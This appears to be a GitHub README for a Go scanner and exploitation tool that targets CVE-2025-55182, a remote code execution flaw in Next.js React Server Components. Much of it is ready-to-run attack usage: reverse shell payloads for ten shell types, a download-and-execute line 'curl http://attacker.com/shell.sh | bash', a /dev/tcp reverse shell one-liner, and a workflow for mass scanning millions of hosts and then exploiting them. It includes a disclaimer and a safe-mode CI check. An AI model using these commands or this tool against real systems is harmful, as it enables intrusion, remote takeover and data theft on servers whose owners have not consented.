# CVE-2025-55182 Scanner

[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev/)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey)]()

A high-performance, memory-efficient scanner and exploitation tool for CVE-2025-55182, a critical Remote Code Execution (RCE) vulnerability in Next.js React Server Components (RSC).

## Disclaimer

**This tool is intended for authorized security testing and educational purposes only.** Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
  - [Scanning](#scanning)
  - [Exploitation](#exploitation)
  - [Command Execution](#command-execution)
- [Memory Management](#memory-management)
- [Examples](#examples)
- [Output Formats](#output-formats)
- [How It Works](#how-it-works)
- [Building from Source](#building-from-source)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- **Fast Scanning** - Multi-threaded scanning with configurable concurrency
- **RCE Detection** - Confirms code execution with mathematical proof
- **Safe Mode** - Detect vulnerable endpoints without executing code
- **Exploitation** - Built-in reverse shell payloads for 10+ shell types
- **Memory Efficient** - Object pooling, streaming I/O, and configurable memory limits
- **Multiple Outputs** - Text, JSON, and streaming output modes
- **TLS Support** - Full HTTPS support with optional certificate verification

---

## Installation

### Pre-built Binaries

Download the latest release for your platform from the [Releases](https://github.com/yourusername/cve-2025-55182/releases) page.

### Using Go

```bash
go install github.com/yourusername/cve-2025-55182@latest
```

### From Source

```bash
git clone https://github.com/yourusername/cve-2025-55182.git
cd cve-2025-55182
go build -o scanner .
```

---

## Quick Start

```bash
# Scan a single target
./scanner scan -u example.com

# Scan multiple targets from file
./scanner scan -l targets.txt -t 50

# Safe scan (no code execution)
./scanner scan -u example.com -safe

# Exploit vulnerable target
./scanner exploit -u vulnerable.com -lhost 10.0.0.5 -lport 4444
```

---

## Usage

### Scanning

Scan targets to identify vulnerable Next.js applications.

```bash
./scanner scan [options]
```

#### Options

| Flag | Description | Default |
|------|-------------|---------|
| `-u` | Single target URL or IP | - |
| `-l` | File containing targets (one per line) | - |
| `-p` | Target port | `443` |
| `-path` | Request path | `/` |
| `-t` | Number of concurrent threads | `10` |
| `-timeout` | Request timeout in seconds | `10` |
| `-safe` | Safe mode - detect without code execution | `false` |
| `-no-tls` | Use HTTP instead of HTTPS | `false` |
| `-k` | Skip TLS certificate verification | `true` |
| `-o` | Output file for vulnerable hosts | - |
| `-json` | Output results as JSON | `false` |
| `-v` | Verbose output | `false` |
| `-q` | Quiet mode | `false` |
| `-max-mem` | Maximum memory usage in MB (0 = unlimited) | `0` |
| `-stream` | Stream mode - write results immediately | `false` |

#### Examples

```bash
# Basic scan
./scanner scan -u example.com

# Scan with custom port and path
./scanner scan -u example.com -p 3000 -path /api/action

# High-performance scan with 100 threads
./scanner scan -l targets.txt -t 100 -o vulnerable.txt

# Memory-limited scan for large target lists
./scanner scan -l targets.txt -t 50 -max-mem 256 -stream

# Safe detection mode
./scanner scan -l targets.txt -safe -v

# JSON output for integration
./scanner scan -l targets.txt -json > results.json
```

---

### Exploitation

Send reverse shell payloads to vulnerable targets.

```bash
./scanner exploit [options]
```

#### Options

| Flag | Description | Default |
|------|-------------|---------|
| `-u` | Target URL or IP | - |
| `-p` | Target port | `443` |
| `-path` | Request path | `/` |
| `-lhost` | Listener IP address | - |
| `-lport` | Listener port | `4444` |
| `-shell` | Shell type | `node` |
| `-no-tls` | Use HTTP instead of HTTPS | `false` |
| `-k` | Skip TLS certificate verification | `true` |
| `-timeout` | Request timeout in seconds | `30` |

#### Supported Shell Types

| Shell | Description |
|-------|-------------|
| `node` | Node.js reverse shell (default, most reliable) |
| `bash` | Bash reverse shell |
| `sh` | POSIX shell reverse shell |
| `nc` | Netcat with FIFO |
| `nc-e` | Netcat with `-e` flag |
| `python` | Python 2 reverse shell |
| `python3` | Python 3 reverse shell |
| `perl` | Perl reverse shell |
| `ruby` | Ruby reverse shell |
| `php` | PHP reverse shell |

#### Examples

```bash
# Start listener first
nc -lvnp 4444

# Send Node.js reverse shell (recommended)
./scanner exploit -u vulnerable.com -lhost 10.0.0.5 -lport 4444

# Use bash reverse shell
./scanner exploit -u vulnerable.com -lhost 10.0.0.5 -shell bash

# Target on custom port with HTTP
./scanner exploit -u 192.168.1.100 -p 3000 -no-tls -lhost 10.0.0.5
```

---

### Command Execution

Execute arbitrary commands on vulnerable targets.

```bash
./scanner exec [options]
```

#### Options

| Flag | Description | Default |
|------|-------------|---------|
| `-u` | Target URL or IP | - |
| `-p` | Target port | `443` |
| `-path` | Request path | `/` |
| `-c` | Command to execute | - |
| `-no-tls` | Use HTTP instead of HTTPS | `false` |
| `-k` | Skip TLS certificate verification | `true` |
| `-timeout` | Request timeout in seconds | `30` |

#### Examples

```bash
# Execute simple command
./scanner exec -u vulnerable.com -c 'id'

# Download and execute payload
./scanner exec -u vulnerable.com -c 'curl http://attacker.com/shell.sh | bash'

# Create reverse shell manually
./scanner exec -u vulnerable.com -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
```

---

## Memory Management

The scanner is optimized for low memory usage and includes several features for handling large-scale scans.

### Memory Limiting

Use `-max-mem` to set a maximum memory threshold in megabytes:

```bash
# Limit to 256 MB
./scanner scan -l targets.txt -max-mem 256

# Limit to 1 GB
./scanner scan -l targets.txt -max-mem 1024

# Limit to 2 GB
./scanner scan -l targets.txt -max-mem 2048
```

### Stream Mode

For massive target lists (millions of hosts), use stream mode to avoid storing results in memory:

```bash
./scanner scan -l massive_list.txt -t 100 -max-mem 256 -stream -o results.txt
```

### Memory Optimization Techniques

The scanner employs several optimization techniques:

| Technique | Description |
|-----------|-------------|
| Object Pooling | Reuses buffers, string builders, and HTTP clients |
| Streaming I/O | Reads response bodies in chunks, not all at once |
| Pre-built Payloads | Constructs payloads once at startup |
| Pre-compiled Regex | Compiles patterns once globally |
| Worker Pool | Fixed goroutine count prevents memory explosion |
| Aggressive GC | Forces garbage collection under memory pressure |

### Recommended Settings

| Scenario | Command |
|----------|---------|
| Small scan (<1,000 targets) | `./scanner scan -l targets.txt -t 50` |
| Medium scan (1K-100K targets) | `./scanner scan -l targets.txt -t 100 -max-mem 512` |
| Large scan (100K-1M targets) | `./scanner scan -l targets.txt -t 200 -max-mem 1024 -stream` |
| Massive scan (>1M targets) | `./scanner scan -l targets.txt -t 200 -max-mem 256 -stream` |

---

## Examples

### Penetration Testing Workflow

```bash
# 1. Discover targets (example using subfinder + httpx)
subfinder -d target.com | httpx -silent > targets.txt

# 2. Safe scan to identify potentially vulnerable hosts
./scanner scan -l targets.txt -t 100 -safe -o potentially_vulnerable.txt

# 3. Confirm RCE on potentially vulnerable hosts
./scanner scan -l potentially_vulnerable.txt -t 20 -o confirmed_vulnerable.txt

# 4. Exploit confirmed vulnerable target
nc -lvnp 4444 &
./scanner exploit -u vulnerable.target.com -lhost $(curl -s ifconfig.me) -lport 4444
```

### CI/CD Security Pipeline

```bash
# Scan staging environment and fail build if vulnerable
./scanner scan -u staging.example.com -safe -q
if [ $? -eq 1 ]; then
    echo "VULNERABLE: Blocking deployment"
    exit 1
fi
```

### JSON Output Processing

```bash
# Scan and process with jq
./scanner scan -l targets.txt -json | jq '.[] | select(.vulnerable==true) | .host'

# Export to CSV
./scanner scan -l targets.txt -json | jq -r '.[] | [.host, .vulnerable, .status_code] | @csv'
```

---

## Output Formats

### Standard Output

```
[*] Targets: 1000 | Threads: 50 | Safe mode: false
[VULN] https://vulnerable1.com
       RCE confirmed via X-Action-Redirect header
[VULN] https://vulnerable2.com
       RCE confirmed via Location header
[*] Completed in 45.231s
    Scanned:    1000
    Vulnerable: 2
    Errors:     15
    Peak mem:   128MB
```

### JSON Output

```json
[
  {
    "host": "https://vulnerable1.com",
    "vulnerable": true,
    "status_code": 307,
    "evidence": "RCE confirmed via X-Action-Redirect header",
    "timestamp": 1704067200
  },
  {
    "host": "https://safe.com",
    "status_code": 404,
    "timestamp": 1704067201
  }
]
```

### Vulnerable Hosts File

```
https://vulnerable1.com
https://vulnerable2.com
https://vulnerable3.com
```

---

## How It Works

### Vulnerability Overview

CVE-2025-55182 is a critical RCE vulnerability in Next.js applications using React Server Components (RSC). The vulnerability exists in the server action handling mechanism.

### Detection Method

1. **RCE Mode**: Sends a payload that executes `echo $((41*271))` and checks for `11111` in the response
2. **Safe Mode**: Sends a malformed RSC request and analyzes error responses for vulnerable patterns

### Payload Structure

The exploit uses a specially crafted multipart form request that:

1. Abuses prototype pollution in the RSC parser
2. Gains code execution through the `Function` constructor
3. Triggers a redirect containing the command output

---

## Building from Source

### Requirements

- Go 1.21 or higher

### Build Commands

```bash
# Clone repository
git clone https://github.com/yourusername/cve-2025-55182.git
cd cve-2025-55182

# Build for current platform
go build -o scanner .

# Build with optimizations
go build -ldflags="-s -w" -o scanner .

# Cross-compile for Linux
GOOS=linux GOARCH=amd64 go build -o scanner-linux-amd64 .

# Cross-compile for Windows
GOOS=windows GOARCH=amd64 go build -o scanner-windows-amd64.exe .

# Cross-compile for macOS (Intel)
GOOS=darwin GOARCH=amd64 go build -o scanner-darwin-amd64 .

# Cross-compile for macOS (Apple Silicon)
GOOS=darwin GOARCH=arm64 go build -o scanner-darwin-arm64 .
```

### Running Tests

```bash
go test -v ./...
```

---

## Contributing

Contributions are welcome. Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

## Legal Notice

This tool is provided for educational and authorized security testing purposes only. The authors are not responsible for any misuse or damage caused by this tool. Always obtain proper authorization before testing any systems you do not own.

---

## Acknowledgments

- Next.js Security Team for responsible disclosure handling
- The security research community
